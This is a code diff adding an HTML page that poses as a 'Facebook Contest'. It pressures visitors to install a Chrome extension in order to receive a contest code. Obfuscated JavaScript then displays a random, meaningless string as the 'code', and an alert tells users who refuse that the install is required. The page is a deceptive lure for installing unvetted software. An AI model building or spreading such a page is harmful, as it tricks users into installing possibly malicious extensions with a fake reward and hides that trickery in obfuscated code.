@@ -1,0 +1,74 @@
+<html>
+  <head>
+		<link rel="chrome-webstore-item" href="https://chrome.google.com/webstore/detail/mnagejdhifpmdhmiejpapilgmlnommlk">
+
+    <link rel="stylesheet" href="http://hackerthemes.com/node_modules/bootstrap/dist/css/bootstrap.min.css" media="all">
+  <link rel="stylesheet" href="http://hackerthemes.com/node_modules/font-awesome/css/font-awesome.css" media="all">
+
+  <script type='text/javascript' src='http://hackerthemes.com/node_modules/jquery/dist/jquery.min.js'></script>
+  <script src="http://hackerthemes.com//node_modules/tether/dist/js/tether.min.js"></script>
+  <script type='text/javascript' src='http://hackerthemes.com/node_modules/bootstrap/dist/js/bootstrap.min.js'></script>
+	<meta name="google-site-verification" content="KB9aD1Q9Iy5dIQoxA6xQt30d1Rbe1CYJ94u3TSncV6s" />
+  <style>
+  .vertical-center {
+    position:relative;
+    top:20%;
+}
+
+.navbar .navbar-nav {
+  display: inline-block;
+  float: none;
+  vertical-align: top;
+}
+
+.navbar .navbar-collapse {
+  text-align: center;
+}
+
+  </style>
+</head>
+  <body>
+<div class="vertical-center">
+<center>
+<div class="jumbotron col-md-10 col-md-offset-1">
+  <h1 class="display-3">Facebook Contest</h1>
+  <hr class="m-y-2">
+	<p class="lead">Click on the Button below to Add the chrome extension..<br/>After Adding you will see the "CODE" that you need
+                  calling extra attention to featured content or information.</p>
+	<div id="code">
+		<p class="lead">
+    	<a class="btn btn-primary btn-lg" onclick="chrome.webstore.install('https://chrome.google.com/webstore/detail/cpioechnjgdjbhklpkhinhooblipfdak',suc,fail)" id="install-button" href="#" role="button">Add to Chrome</a>
+  	</p>
+	</div>
+</center>
+</div>
+<script>
+if (chrome.app.isInstalled) {
+  document.getElementById('install-button').style.display = 'none';
+}
+</script>
+
+<br />
+<script>
+
+var _0x687f=["\x72\x61\x6E\x64\x6F\x6D","\x66\x6C\x6F\x6F\x72","\x56\x49\x54","\x74\x6F\x55\x70\x70\x65\x72\x43\x61\x73\x65","\x73\x75\x62\x73\x74\x72","","\x72\x65\x70\x6C\x61\x63\x65","\x41\x43"];function gri(_0x4677x2,_0x4677x3){return Math[_0x687f[1]](Math[_0x687f[0]]()*(_0x4677x3-_0x4677x2+1))+_0x4677x2}function gen(){var _0x4677x5=_0x687f[2];var _0x4677x6=gri(0,9).toString();var _0x4677x7=Math[_0x687f[0]]().toString(36)[_0x687f[6]](/[^a-z]+/g,_0x687f[5])[_0x687f[4]](1,1)[_0x687f[3]]();var _0x4677x8=gri(0,9).toString();var _0x4677x9=gri(0,9).toString();var _0x4677xa=_0x687f[7];var _0x4677xb=gri(0,9).toString();var _0x4677xc=gri(0,9).toString();var _0x4677xd=_0x4677x5+_0x4677x6+_0x4677x7+_0x4677x8+_0x4677x9+_0x4677xa+_0x4677xb+_0x4677xc;return _0x4677xd}
+
+function suc(){
+document.getElementById('install-button').style.display = 'none';
+document.getElementById('code').innerHTML="<h1>code: "+gen()+"</h1>";
+
+}
+
+
+function fail(){
+alert("You should install extension to get the code!");
+}
+
+
+
+</script>
+
+</div>
+
+  </body>
+</html>
